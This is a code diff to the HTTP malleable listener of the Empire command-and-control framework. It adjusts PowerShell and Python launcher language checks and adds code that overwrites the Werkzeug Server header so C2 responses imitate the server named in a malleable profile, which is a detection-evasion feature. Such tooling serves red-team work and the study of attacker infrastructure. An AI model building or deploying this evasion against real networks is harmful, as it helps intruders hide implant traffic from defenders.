@@ -13,6 +13,7 @@ from builtins import object, str
 from typing import List, Optional, Tuple
 
 from flask import Flask, Response, make_response, request
+from werkzeug.serving import WSGIRequestHandler
 
 from empire.server.common import encryption, helpers, malleable, packets, templating
 from empire.server.common.empire import MainMenu
@@ -304,8 +305,7 @@ class Listener(object):
                 else:
                     profile.stager.client.headers["User-Agent"] = userAgent
 
-            if language.lower().startswith("po"):
-                # PowerShell
+            if language == "powershell":
                 launcherBase = '$ErrorActionPreference = "SilentlyContinue";'
 
                 if safeChecks.lower() == "true":
@@ -457,9 +457,7 @@ class Listener(object):
                 else:
                     return launcherBase
 
-            elif language.lower().startswith("py"):
-                # Python
-
+            elif language in ["python", "ironpython"]:
                 # ==== HANDLE IMPORTS ====
                 launcherBase = "import sys,base64\n"
                 launcherBase += "import urllib.request,urllib.parse\n"
@@ -583,7 +581,7 @@ class Listener(object):
 
             else:
                 log.error(
-                    "listeners/template generate_launcher(): invalid language specification: only 'powershell' and 'python' are currently supported for this module."
+                    "listeners/template generate_launcher(): invalid language specification: c# is currently not supported for this module."
                 )
 
     def generate_stager(
@@ -650,7 +648,6 @@ class Listener(object):
             if not host.endswith("/"):
                 host += "/"
 
-            # Patch in custom Headers
             # patch in custom headers
             if profile.stager.client.headers:
                 headers = ",".join(
@@ -1455,6 +1452,13 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
                                         malleableResponse = (
                                             implementation.construct_server(stager)
                                         )
+
+                                        if "Server" in malleableResponse.headers:
+                                            WSGIRequestHandler.server_version = (
+                                                malleableResponse.headers["Server"]
+                                            )
+                                            WSGIRequestHandler.sys_version = ""
+
                                         return Response(
                                             malleableResponse.body,
                                             malleableResponse.code,
@@ -1588,6 +1592,13 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
                                         malleableResponse = (
                                             implementation.construct_server("")
                                         )
+
+                                        if "Server" in malleableResponse.headers:
+                                            WSGIRequestHandler.server_version = (
+                                                malleableResponse.headers["Server"]
+                                            )
+                                            WSGIRequestHandler.sys_version = ""
+
                                         return Response(
                                             malleableResponse.body,
                                             malleableResponse.code,
@@ -1624,6 +1635,13 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
                                                         "latin-1"
                                                     )
                                                 )
+
+                                            if "Server" in malleableResponse.headers:
+                                                WSGIRequestHandler.server_version = (
+                                                    malleableResponse.headers["Server"]
+                                                )
+                                                WSGIRequestHandler.sys_version = ""
+
                                             return Response(
                                                 malleableResponse.body,
                                                 malleableResponse.code,
@@ -1639,6 +1657,13 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
                                     malleableResponse = implementation.construct_server(
                                         results
                                     )
+
+                                    if "Server" in malleableResponse.headers:
+                                        WSGIRequestHandler.server_version = (
+                                            malleableResponse.headers["Server"]
+                                        )
+                                        WSGIRequestHandler.sys_version = ""
+
                                     return Response(
                                         malleableResponse.body,
                                         malleableResponse.code,
